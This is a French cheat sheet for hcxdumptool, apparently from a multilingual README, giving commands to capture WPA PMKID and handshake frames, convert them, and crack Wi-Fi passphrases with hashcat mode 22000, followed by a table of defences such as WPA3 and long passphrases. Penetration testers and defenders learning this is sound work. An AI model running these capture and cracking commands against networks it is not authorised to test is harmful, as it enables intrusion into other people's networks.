<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire hcxdumptool

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) est un outil d'attaque Wi-Fi et de capture de paquets en ligne de commande moderne et hautes performances. Contrairement aux anciens outils Aircrack-ng, `hcxdumptool` capture les trames WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) ​​sans nécessiter de clients connectés, capture les poignées de main à 4 voies EAPOL et s'intègre directement à `hcxtools` pour le craquage Hashcat (mode 22000).

---

## Table des matières

-[Avantages principaux et architecture moderne](#core-advantages--modern-architecture)
- [Installation (`hcxdumptool` et `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Configuration de l'interface sans fil](#wireless-interface-setup)
- [Capture de PMKID (attaque sans client)](#capturing-pmkid-clientless-attack)
- [Conversion de captures avec `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
-[Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)
- [Filtrage des canaux et des BSSID](#filtering-channels-and-bssids)
-[Contre-mesures défensives et WPA3](#defensive-countermeasures--wpa3)

---

## Avantages fondamentaux et architecture moderne

- **Attaque PMKID sans client :** exploite la fonctionnalité PMKID RSN IE (Robust Security Network Information Element) dans les routeurs modernes. Vous n'avez **pas** besoin d'un client connecté ou de paquets de désauthentification pour capturer les éléments de clé.
- **Mode Hashcat unifié 22000 :** génère des fichiers de hachage natifs Hashcat prenant en charge à la fois les poignées de main PMKID et WPA-PBKDF2-PMK complètes.
- **Channel Hopping & Active Interrogation :** Transmet des demandes d'association ciblées pour obtenir des PMKID à partir des points d'accès en écoute.

---

##Installation (`hcxdumptool` et `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Configuration de l'interface sans fil

Avant d'exécuter `hcxdumptool`, mettez fin aux services de gestion de réseau en arrière-plan qui interfèrent avec l'injection de paquets bruts :
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Capture de PMKID (attaque sans client)

### 1. Capture PMKID générale sur tous les canaux 2,4 GHz et 5 GHz
Capturez tous les points d'accès à proximité d'un fichier `.pcapng` :
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0` : Interface moniteur sans fil.
- `-w capture.pcapng` : Fichier de capture de sortie.
- `--rds=1` : transmet des trames RTS pour demander des réponses AP.

### 2. Capturez un point d'accès cible spécifique (filtre BSSID)
Ciblez uniquement un BSSID autorisé pour éviter d'affecter les routeurs tiers non autorisés :

1. Créez une liste de filtres cibles (`target_bssid.txt`) :
```text
001122334455
```
*(BSSID sans deux-points)*

2. Exécutez une capture ciblée :
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6` : Verrouillage de l'injection et écoute du canal 6.
- `--bpfp` : applique la liste BPF (Berkeley Packet Filter) pour les BSSID cibles.

---

## Conversion de captures avec `hcxpcapngtool`

Une fois les PMKID ou les trames EAPOL collectées, convertissez la capture `.pcapng` dans un format compatible Hashcat :
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000` : fichier de hachage de sortie au format Hashcat moderne.
- `-E essid_list.txt` : enregistrez les noms de réseaux découverts (ESSID) dans un dictionnaire pour un piratage ciblé des mots de passe.
- L'outil rapporte le nombre total de trames PMKID et EAPOL extraites.

---

## Crackage de Hashcat (Mode 22000)

Le mode `22000` est le mode de craquage unifié WPA-PBKDF2-PMKID + EAPOL de Hashcat :

### 1. Attaque par dictionnaire
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Attaque de mutation basée sur des règles
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Masque / Attaque par force brute (mots de passe numériques à 8 chiffres)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Filtrage des canaux et des BSSID

Optimisez la vitesse de capture en limitant les paramètres d'analyse :
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Contre-mesures défensives et WPA3

| Vulnérabilité | Mécanisme d'attaque | Recommandation de défense |
|---|---|---|
| **Mise en cache PMKID** | AP transmet PMKID dans la trame EAPOL 1 sans authentification client | Désactivez 802.11r (Transition rapide / Roaming) si vous n'en avez pas besoin ; mettre à jour le micrologiciel du routeur. |
| **Clé pré-partagée WPA2 faible** | Cracking du dictionnaire PBKDF2 hors ligne (mode Hashcat 22000) | Appliquez des phrases secrètes aléatoires de plus de 16 caractères. |
| **Protocole WPA2 hérité** | Sensible au PMKID et à la capture de poignée de main | Mise à niveau vers **WPA3-Personnel (SAE)** ; WPA3 utilise la poignée de main Dragonfly avec confidentialité transmise, rendant les images capturées incassables hors ligne. |